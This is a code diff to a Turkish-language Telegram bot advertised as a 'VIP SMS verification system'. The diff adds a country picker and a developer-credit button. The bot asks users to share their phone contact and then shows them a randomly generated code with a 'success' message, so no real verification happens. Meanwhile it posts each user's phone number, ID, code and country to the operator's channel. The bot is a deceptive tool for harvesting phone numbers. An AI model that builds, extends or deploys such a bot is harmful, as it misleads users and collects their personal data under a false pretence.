@@ -11,6 +11,7 @@ ADMIN_ID = int(os.getenv("ADMIN_ID"))
 KANAL_ID = int(os.getenv("KANAL_ID"))
 
 waiting_number = set()
+selected_country = {}
 
 if os.path.exists("banned.json"):
     with open("banned.json", "r") as f:
@@ -25,7 +26,22 @@ def save_bans():
 def main_menu():
     return InlineKeyboardMarkup([
         [InlineKeyboardButton("🚀 SMS ONAY BAŞLAT", callback_data="sms")],
-        [InlineKeyboardButton("👑 HESABIM", callback_data="profil")]
+        [InlineKeyboardButton("👑 HESABIM", callback_data="profil")],
+        [InlineKeyboardButton("📈 GELİŞTİRİCİ", callback_data="gelistirici")]
+    ])
+
+def country_menu():
+    return InlineKeyboardMarkup([
+        [InlineKeyboardButton("🇹🇷 Türkiye", callback_data="country_tr"),
+         InlineKeyboardButton("🇺🇸 ABD", callback_data="country_us")],
+        [InlineKeyboardButton("🇩🇪 Almanya", callback_data="country_de"),
+         InlineKeyboardButton("🇫🇷 Fransa", callback_data="country_fr")],
+        [InlineKeyboardButton("🇮🇹 İtalya", callback_data="country_it"),
+         InlineKeyboardButton("🇪🇸 İspanya", callback_data="country_es")],
+        [InlineKeyboardButton("🇬🇧 İngiltere", callback_data="country_gb"),
+         InlineKeyboardButton("🇨🇦 Kanada", callback_data="country_ca")],
+        [InlineKeyboardButton("🇯🇵 Japonya", callback_data="country_jp"),
+         InlineKeyboardButton("🇰🇷 Güney Kore", callback_data="country_kr")]
     ])
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -34,20 +50,20 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     text = f"""
-╔══════════════════════╗
-🌟   VIP SMS ONAY SİSTEMİ   🌟
-╚══════════════════════╝
+╔════════════════════════════╗
+🌟✨ VIP SMS ONAY SİSTEMİ ✨🌟
+╚════════════════════════════╝
 
-👤 {user.first_name}
-🆔 {user.id}
+👤 Kullanıcı: @tanrican
+🆔 ID: {user.id}
 
-━━━━━━━━━━━━━━━━━━━━━━
-⚡ Anında SMS Onay
-🔒 Güvenli İşlem
-💎 Premium Sistem
-━━━━━━━━━━━━━━━━━━━━━━
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+⚡ Hızlı ve Güvenli SMS Onay
+🔒 Tam Otomatik İşlem
+💎 Premium VIP Deneyimi
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-⬇️ İşlem seç
+⬇️ Devam etmek için bir işlem seç:
 """
 
     await update.message.reply_text(text, reply_markup=main_menu())
@@ -59,28 +75,59 @@ async def menu_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     await query.answer()
 
-    if query.data == "sms":
+    data = query.data
+
+    if data == "sms":
+        await query.message.reply_text("🌍 Bir ülke seç:", reply_markup=country_menu())
+
+    elif data.startswith("country_"):
+        country_name = {
+            "country_tr": "🇹🇷 Türkiye",
+            "country_us": "🇺🇸 ABD",
+            "country_de": "🇩🇪 Almanya",
+            "country_fr": "🇫🇷 Fransa",
+            "country_it": "🇮🇹 İtalya",
+            "country_es": "🇪🇸 İspanya",
+            "country_gb": "🇬🇧 İngiltere",
+            "country_ca": "🇨🇦 Kanada",
+            "country_jp": "🇯🇵 Japonya",
+            "country_kr": "🇰🇷 Güney Kore"
+        }[data]
+
+        selected_country[user.id] = country_name
         waiting_number.add(user.id)
+
         btn = KeyboardButton("📲 NUMARA GÖNDER", request_contact=True)
         kb = ReplyKeyboardMarkup([[btn]], resize_keyboard=True, one_time_keyboard=True)
 
-        await query.message.reply_text("""
+        await query.message.reply_text(f"""
 ╔══════════════╗
 📡 SMS ONAY
 ╚══════════════╝
 
-Numaranı gönder
+Ülke: {country_name}
+Numaranı göndererek SMS onay kodunu alabilirsin!
 """, reply_markup=kb)
 
-    elif query.data == "profil":
+    elif data == "profil":
         await query.message.reply_text(f"""
 ╔══════════════╗
-👑 HESABIM
+👑 HESABIM 👑
 ╚══════════════╝
 
+👤 Kullanıcı Adı: @tanrican
 🆔 ID: {user.id}
-👤 İsim: {user.first_name}
-💎 Durum: VIP
+💎 Durum: VIP Kullanıcı
+""")
+
+    elif data == "gelistirici":
+        await query.message.reply_text(f"""
+╔════════════════════╗
+🚀 GELİŞTİRİCİ 🚀
+╚════════════════════╝
+
+💻 Botun yaratıcısı: @tanrican
+✨ Premium destek ve geliştirmeler için iletişim kurabilirsiniz.
 """)
 
 async def contact_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -91,8 +138,8 @@ async def contact_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     waiting_number.remove(user.id)
+    country_name = selected_country.get(user.id, "Bilinmiyor")
 
-    phone = update.message.contact.phone_number
     code = random.randint(100000, 999999)
     time = datetime.now(ZoneInfo("Europe/Istanbul")).strftime("%d.%m.%Y %H:%M:%S")
 
@@ -101,16 +148,20 @@ async def contact_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 ✅ SMS ONAY
 ╚══════════════╝
 
-🔢 {code}
+Ülke: {country_name}
+🔢 Kodun: {code}
+📲 İşlem Başarılı!
 """)
 
+    phone = update.message.contact.phone_number
     text = f"""
 🚨 YENİ SMS ONAY
 
-👤 Kullanıcı: {user.first_name}
+👤 Kullanıcı: @tanrican
 🆔 ID: {user.id}
 📞 Numara: {phone}
 🔢 Kod: {code}
+🌍 Ülke: {country_name}
 🕒 Saat: {time}
 """
 
@@ -125,7 +176,8 @@ async def ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         uid = int(context.args[0])
         banned_users.add(uid)
-        save_bans()
+        with open("banned.json", "w") as f:
+            json.dump(list(banned_users), f)
         await update.message.reply_text("✅ Kullanıcı banlandı")
     except:
         await update.message.reply_text("❌ Geçersiz ID")
@@ -139,7 +191,8 @@ async def unban(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         uid = int(context.args[0])
         banned_users.discard(uid)
-        save_bans()
+        with open("banned.json", "w") as f:
+            json.dump(list(banned_users), f)
         await update.message.reply_text("✅ Ban kaldırıldı")
     except:
         await update.message.reply_text("❌ Geçersiz ID")
@@ -153,3 +206,4 @@ app.add_handler(CallbackQueryHandler(menu_buttons))
 app.add_handler(MessageHandler(filters.CONTACT, contact_handler))
 
 app.run_polling()
+    
